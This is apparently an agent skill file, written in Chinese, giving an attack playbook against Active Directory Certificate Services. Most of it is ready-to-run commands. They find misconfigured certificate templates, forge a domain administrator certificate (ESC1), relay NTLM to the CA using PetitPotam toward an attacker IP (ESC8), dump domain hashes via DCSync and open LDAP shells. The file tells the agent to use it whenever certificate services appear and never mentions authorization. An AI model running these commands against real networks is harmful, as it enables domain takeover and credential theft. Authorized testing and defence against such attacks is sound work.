---
name: adcs-certipy-attack
description: "Active Directory Certificate Services (ADCS) 证书攻击。当发现域内有 CA 服务器、ADCS Web Enrollment、证书模板配置错误时使用。覆盖 ESC1-ESC11 所有证书滥用路径、Certipy 工具链、证书伪造、NTLM 中继到 ADCS。发现 ADCS/CA/证书/certsrv 相关内容时一定要使用此技能"
metadata:
  tags: "adcs,certipy,certificate,证书,ca,esc1,esc2,esc3,esc4,esc8,域控,活动目录,证书攻击,pkinit,certifried,CVE-2022-26923,dnshostname"
  category: "lateral"
---

# ADCS 证书攻击方法论

ADCS 是 Active Directory 的 PKI 基础设施。错误配置的证书模板可以让低权限用户直接获取域管权限——这是目前域渗透中最被低估也最强大的攻击面。

## ⛔ 深入参考（必读）

- ESC1-ESC11 各漏洞详细利用命令和条件 → [references/esc-techniques.md](references/esc-techniques.md)
- 模板 ACL 滥用 (ESC4)、ESC7/ESC11、模板枚举与清理 → [references/template-acl-attacks.md](references/template-acl-attacks.md)
- Golden Certificate、Schannel 认证、证书格式转换、持久化 → [references/certificate-persistence.md](references/certificate-persistence.md)
- → [references/certifried-attack.md](references/certifried-attack.md) — CVE-2022-26923 Certifried 机器账户证书欺骗

---

## Phase 1: ADCS 发现

```bash
# 发现 CA 服务器
netexec ldap DC_IP -u USER -p PASS -M adcs
# 输出 CA 名称和服务器

# Certipy 枚举（推荐）
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -enabled -vulnerable
# 输出 JSON/TXT 报告，自动标注漏洞模板

# 手动 LDAP 查询
ldapsearch -H ldap://DC_IP -D "USER@DOMAIN" -w PASS \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com"
```

### ADCS Web Enrollment 检测
```bash
# 访问 Web 界面
curl -sk https://CA_SERVER/certsrv/
# 返回 401 或登录页 → ADCS Web Enrollment 存在
```

## Phase 2: 漏洞决策树

```
发现了什么？
├─ ESC1: 模板允许申请者指定 SAN → 冒充任意用户
├─ ESC2: 模板有 Any Purpose / SubCA → 签发任意证书
├─ ESC3: 模板有 Certificate Request Agent → 代理申请
├─ ESC4: 有模板写权限 → 修改模板为 ESC1
├─ ESC6: CA 启用 EDITF_ATTRIBUTESUBJECTALTNAME2 → 全局 ESC1
├─ ESC7: 有 CA 管理员权限 → 签发被拒绝的请求
├─ ESC8: ADCS Web Enrollment + NTLM Relay → 中继获取证书
├─ ESC9/10/11: 新型攻击路径
└─ 无明显漏洞 → 检查 NTLM Relay 到 ADCS
详细命令 → [references/esc-techniques.md](references/esc-techniques.md)
```

**最常见的攻击路径**：
1. **ESC1** — 存在配置错误模板，直接申请域管证书
2. **ESC8** — PetitPotam + NTLM Relay 到 ADCS，获取域控证书
3. **ESC4** — 有写权限的模板，改成 ESC1 再利用

## Phase 3: ESC1 快速利用（最常见）

ESC1 条件：模板允许 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`（申请者可指定 SAN）

```bash
# 用 Certipy 申请域管证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA_NAME -template VULN_TEMPLATE \
  -upn administrator@DOMAIN

# 用证书认证获取 TGT
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# 输出: administrator  Hash: aad3b435...

# DCSync
impacket-secretsdump -hashes :HASH DOMAIN/administrator@DC_IP
```

## Phase 4: ESC8 中继攻击

```bash
# 1. 启动 ntlmrelayx 中继到 ADCS
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 2. 强制域控认证
python3 PetitPotam.py ATTACKER_IP DC_IP

# 3. 获取域控证书（Base64 输出）
# 保存并认证
echo "BASE64" | base64 -d > dc.pfx
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

## Phase 5: 证书认证

```bash
# Certipy 认证（自动请求 TGT + 提取 NTLM）
certipy auth -pfx user.pfx -dc-ip DC_IP

# 如果 PKINIT 不可用（报错 KDC_ERR_PADATA_TYPE_NOSUPP）
# 使用 Schannel 认证
certipy auth -pfx user.pfx -dc-ip DC_IP -ldap-shell

# 或用 PassTheCert（工具路径默认安装在: /pentest/PassTheCert/Python/）
python3 /pentest/PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain DOMAIN -dc-ip DC_IP
```

## 工具速查
| 工具 | 用途 |
|------|------|
| certipy | ADCS 枚举 + 利用全流程 |
| ntlmrelayx.py | NTLM 中继到 ADCS |
| PetitPotam | 强制域控认证 |
| Rubeus | Windows 下证书认证 |
| PassTheCert | 证书直接认证（无 PKINIT） |

## 关键概念
- **SAN**（Subject Alternative Name）：证书中的身份字段，ESC1 允许申请者指定 → 冒充任何人
- **PKINIT**：用证书进行 Kerberos 预认证 → 获取 TGT → 提取 NTLM Hash
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**：模板标志，允许申请者自定义 SAN = ESC1
